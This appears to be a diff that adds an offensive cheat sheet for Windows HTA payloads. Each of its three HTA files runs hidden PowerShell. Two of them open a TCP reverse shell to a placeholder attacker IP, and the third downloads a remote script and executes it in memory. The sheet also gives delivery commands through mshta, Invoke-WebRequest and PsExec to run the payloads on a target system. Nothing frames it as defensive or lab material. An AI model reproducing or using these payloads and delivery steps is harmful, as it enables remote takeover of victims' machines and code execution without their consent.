@@ -1,0 +1,147 @@
+Craft the HTA File:
+
+code: 
+---------------
+<html>
+<head>
+    <title>Reverse Shell</title>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="ReverseShell"
+        BORDER="thin"
+        CAPTION="yes"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"/>
+</head>
+<body>
+    <script language="VBScript">
+        Dim objShell
+        Set objShell = CreateObject("WScript.Shell")
+        ' Replace LHOST and LPORT with your attacker's IP address and port
+        objShell.Run "powershell -nop -w hidden -c ""$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$bytes = [text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($bytes,0,$bytes.Length);$stream.Flush()};$client.Close()"" "
+    </script>
+</body>
+</html>
+----------------
+
+NOTE: Change LHOST and LPORT 
+
+save it .hta extension....
+
+Start Listener....
+----------------------------
+
+host .hta file in a python server
+
+
+IN Target SYSTEM...
+
+DOWNLOAD USING POWERSHELL....
+
+Host your HTA file on a web server.
+Execute it remotely using PowerShell:
+
+You can use PowerShell to invoke the HTA file from a remote server:
+
+PS:> Invoke-WebRequest -Uri "http://YourServer/YourFile.hta" -OutFile "$env:TEMP\temp.hta"
+Start-Process mshta.exe "$env:TEMP\temp.hta"
+
+Method 2: Using PsExec:--->
+
+PS:> psexec \\TargetMachineName mshta.exe "\\ServerShare\YourFile.hta"
+
+
+
+Execute:--->
+
+PS:> Start-Process mshta.exe "http://localhost:8080/YourFile.hta"
+
+
+============================================
+
+Steps to Execute an HTA File in Memory:--->
+
+Use PowerShell to Execute the HTA:
+
+PS:> Start-Process mshta.exe "http://YourServer/YourFile.hta"
+
+OR
+
+mshta http://YourServer/YourFile.hta
+
+
+====================================================================
+
+###---- OR ------###
+
+Steps to Run an HTA Reverse Shell File Directly in Memory:
+
+----------------
+<html>
+<head>
+    <title>Reverse Shell</title>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="ReverseShell"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="hidden"/>
+    <script language="VBScript">
+        Dim objShell
+        Set objShell = CreateObject("WScript.Shell")
+        ' Replace with your attacker's IP and port
+        cmd = "powershell -windowstyle hidden -exec bypass -c ""(New-Object System.Net.Sockets.TCPClient('YourAttackerIP', YourPort)).GetStream() | ForEach-Object { $bytes = 0..65535 | ForEach-Object {0}; while(($i = $_.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $bytes = [text.encoding]::ASCII.GetBytes($sendback2); $_.Write($bytes,0,$bytes.Length); $_.Flush() } }"""
+        objShell.Run cmd, 0, False
+    </script>
+</head>
+<body>
+    <script>self.close();</script>
+</body>
+</html>
+-----------------
+
+Execute the HTA File via a Link:-->
+
+Target System:-->
+
+mshta.exe "http://YourServer/ReverseShell.hta"
+
+###==========###===========###
+
+
+Example of Embedded Script:--->
+
+If you want to embed a script within the HTA that executes commands in memory, you can structure your HTA like this:
+
+code:
+-------------
+<html>
+<head>
+    <title>Execute in Memory</title>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="ExecuteInMemory"
+        BORDER="thin"
+        CAPTION="yes"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"/>
+    <script language="VBScript">
+        Sub Window_OnLoad
+            Dim objShell
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run "powershell -windowstyle hidden -Command ""(New-Object System.Net.WebClient).DownloadString('http://YourServer/YourScript.ps1') | Invoke-Expression""", 0, False
+        End Sub
+    </script>
+</head>
+<body>
+    <h1>Executing Script in Memory</h1>
+</body>
+</html>
+-------------
+
+Execution:
+When you run the above HTA file using mshta.exe, it will execute the embedded PowerShell command that fetches and runs a PowerShell script directly from your server without saving it locally.
+
+
+
